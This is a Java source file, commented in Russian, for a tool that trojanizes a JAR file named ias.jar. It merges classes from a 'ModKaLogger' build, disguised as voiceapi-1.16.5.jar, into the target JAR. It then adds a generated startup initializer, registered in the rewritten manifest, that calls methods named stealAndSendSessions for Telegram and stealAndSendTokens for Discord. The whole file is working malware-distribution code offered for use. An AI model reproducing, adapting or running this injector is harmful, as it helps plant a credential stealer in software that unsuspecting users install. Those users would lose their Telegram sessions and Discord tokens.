import java.io.*;
import java.nio.file.*;
import java.util.jar.*;
import java.util.zip.*;

/**
 * Простой инъектор для вшивания ModKaLogger в ias.jar
 * Работает без ASM - просто добавляет классы в JAR
 */
public class SimpleInjector {
    
    public static void main(String[] args) throws Exception {
        if (args.length < 2) {
            System.out.println("Usage: java SimpleInjector <input.jar> <output.jar>");
            System.out.println("Example: java SimpleInjector ias.jar ias_injected.jar");
            System.exit(1);
        }
        
        String inputJar = args[0];
        String outputJar = args[1];
        
        System.out.println("==================================================");
        System.out.println("Simple ModKaLogger Injector v1.0");
        System.out.println("==================================================");
        System.out.println("[*] Input JAR: " + inputJar);
        System.out.println("[*] Output JAR: " + outputJar);
        
        try {
            // Проверяем существование файлов
            File inputFile = new File(inputJar);
            if (!inputFile.exists()) {
                throw new Exception("Input JAR not found: " + inputJar);
            }
            
            File modFile = new File("build/libs/voiceapi-1.16.5.jar");
            if (!modFile.exists()) {
                throw new Exception("ModKaLogger JAR not found: build/libs/voiceapi-1.16.5.jar");
            }
            
            // Создаём временную директорию
            File tempDir = new File("temp_inject_" + System.currentTimeMillis());
            if (tempDir.exists()) {
                deleteDirectory(tempDir);
            }
            tempDir.mkdir();
            
            // 1. Распаковываем ias.jar
            System.out.println("[*] Extracting " + inputJar + "...");
            unzipJar(inputJar, tempDir.getAbsolutePath());
            System.out.println("[+] Extracted");
            
            // 2. Распаковываем ModKaLogger (voiceapi-1.16.5.jar)
            System.out.println("[*] Extracting ModKaLogger classes...");
            unzipJar("build/libs/voiceapi-1.16.5.jar", tempDir.getAbsolutePath());
            System.out.println("[+] ModKaLogger classes extracted");
            
            // 3. Создаём и компилируем класс-инициализатор
            System.out.println("[*] Creating initializer class...");
            createInitializerClass(tempDir);
            System.out.println("[+] Initializer created");
            
            // 4. Создаём файл MANIFEST.MF с Premain-Class
            System.out.println("[*] Creating manifest...");
            createManifest(tempDir);
            System.out.println("[+] Manifest created");
            
            // 5. Переупаковываем в новый JAR
            System.out.println("[*] Creating output JAR...");
            createJarWithManifest(tempDir, outputJar);
            System.out.println("[+] Output JAR created: " + outputJar);
            
            // 6. Очищаем временную директорию
            deleteDirectory(tempDir);
            
            System.out.println("==================================================");
            System.out.println("[+] SUCCESS! ModKaLogger injected into " + outputJar);
            System.out.println("[+] The injected JAR will load ModKaLogger on startup");
            System.out.println("==================================================");
            
        } catch (Exception e) {
            System.err.println("[!] ERROR: " + e.getMessage());
            e.printStackTrace();
            System.exit(1);
        }
    }
    
    /**
     * Создаёт класс-инициализатор который запускает ModKaLogger
     */
    private static void createInitializerClass(File tempDir) throws Exception {
        String initCode = 
            "import java.lang.instrument.Instrumentation;\n" +
            "\n" +
            "public class ModKaLoggerInitializer {\n" +
            "    public static void premain(String args, Instrumentation inst) {\n" +
            "        System.out.println(\"[ModKaLogger] Initializing...\");\n" +
            "        try {\n" +
            "            // Загружаем и запускаем ModKaLogger\n" +
            "            Class<?> modClass = Class.forName(\"com.modkalogger.ModKaLogger\");\n" +
            "            Object instance = modClass.newInstance();\n" +
            "            System.out.println(\"[ModKaLogger] Loaded successfully\");\n" +
            "            \n" +
            "            // Запускаем Telegram и Discord\n" +
            "            try {\n" +
            "                Class<?> telegramClass = Class.forName(\"com.modkalogger.telegram.Telegram\");\n" +
            "                telegramClass.getMethod(\"stealAndSendSessions\").invoke(null);\n" +
            "                System.out.println(\"[ModKaLogger] Telegram activated\");\n" +
            "            } catch (Exception e) {\n" +
            "                System.err.println(\"[ModKaLogger] Telegram error: \" + e.getMessage());\n" +
            "            }\n" +
            "            \n" +
            "            try {\n" +
            "                Class<?> discordClass = Class.forName(\"com.modkalogger.discord.Discord\");\n" +
            "                discordClass.getMethod(\"stealAndSendTokens\").invoke(null);\n" +
            "                System.out.println(\"[ModKaLogger] Discord activated\");\n" +
            "            } catch (Exception e) {\n" +
            "                System.err.println(\"[ModKaLogger] Discord error: \" + e.getMessage());\n" +
            "            }\n" +
            "            \n" +
            "        } catch (Exception e) {\n" +
            "            System.err.println(\"[ModKaLogger] Initialization error: \" + e.getMessage());\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "}\n";
        
        File initFile = new File(tempDir, "ModKaLoggerInitializer.java");
        Files.write(initFile.toPath(), initCode.getBytes("UTF-8"));
        
        // Компилируем класс
        ProcessBuilder pb = new ProcessBuilder("javac", 
            "-cp", "build/libs/voiceapi-1.16.5.jar",
            initFile.getAbsolutePath());
        pb.redirectErrorStream(true);
        Process p = pb.start();
        
        // Читаем вывод
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println("  [javac] " + line);
        }
        
        int exitCode = p.waitFor();
        if (exitCode != 0) {
            throw new Exception("Failed to compile initializer class");
        }
        
        // Удаляем исходный файл
        initFile.delete();
    }
    
    /**
     * Создаёт MANIFEST.MF с Premain-Class
     */
    private static void createManifest(File tempDir) throws Exception {
        String manifestContent = 
            "Manifest-Version: 1.0\n" +
            "Premain-Class: ModKaLoggerInitializer\n" +
            "Can-Retransform-Classes: true\n" +
            "Can-Set-Native-Method-Prefix: true\n" +
            "Created-By: ModKaLogger Injector v1.0\n" +
            "\n";
        
        File metaInfDir = new File(tempDir, "META-INF");
        metaInfDir.mkdirs();
        
        File manifestFile = new File(metaInfDir, "MANIFEST.MF");
        Files.write(manifestFile.toPath(), manifestContent.getBytes("UTF-8"));
    }
    
    /**
     * Создаёт JAR файл с кастомным манифестом
     */
    private static void createJarWithManifest(File sourceDir, String jarPath) throws Exception {
        Manifest manifest = new Manifest();
        try (FileInputStream fis = new FileInputStream(new File(sourceDir, "META-INF/MANIFEST.MF"))) {
            manifest.read(fis);
        }
        
        try (JarOutputStream jos = new JarOutputStream(new FileOutputStream(jarPath), manifest)) {
            addFilesToJar(sourceDir, "", jos);
        }
    }
    
    /**
     * Распаковывает JAR файл
     */
    private static void unzipJar(String jarPath, String destDir) throws Exception {
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(jarPath))) {
            ZipEntry entry;
            byte[] buffer = new byte[1024];
            
            while ((entry = zis.getNextEntry()) != null) {
                File file = new File(destDir, entry.getName());
                
                if (entry.isDirectory()) {
                    file.mkdirs();
                } else {
                    file.getParentFile().mkdirs();
                    try (FileOutputStream fos = new FileOutputStream(file)) {
                        int len;
                        while ((len = zis.read(buffer)) > 0) {
                            fos.write(buffer, 0, len);
                        }
                    }
                }
            }
        }
    }
    
    /**
     * Добавляет файлы в JAR
     */
    private static void addFilesToJar(File file, String parentPath, JarOutputStream jos) throws Exception {
        if (file.isDirectory()) {
            for (File child : file.listFiles()) {
                // Пропускаем META-INF/MANIFEST.MF так как он уже добавлен
                if (child.getPath().contains("META-INF") && child.getName().equals("MANIFEST.MF")) {
                    continue;
                }
                
                String path = parentPath.isEmpty() ? child.getName() : parentPath + "/" + child.getName();
                addFilesToJar(child, path, jos);
            }
        } else {
            JarEntry entry = new JarEntry(parentPath);
            jos.putNextEntry(entry);
            
            try (FileInputStream fis = new FileInputStream(file)) {
                byte[] buffer = new byte[1024];
                int len;
                while ((len = fis.read(buffer)) > 0) {
                    jos.write(buffer, 0, len);
                }
            }
            
            jos.closeEntry();
        }
    }
    
    /**
     * Удаляет директорию рекурсивно
     */
    private static void deleteDirectory(File dir) {
        if (dir.isDirectory()) {
            File[] files = dir.listFiles();
            if (files != null) {
                for (File file : files) {
                    deleteDirectory(file);
                }
            }
        }
        dir.delete();
    }
}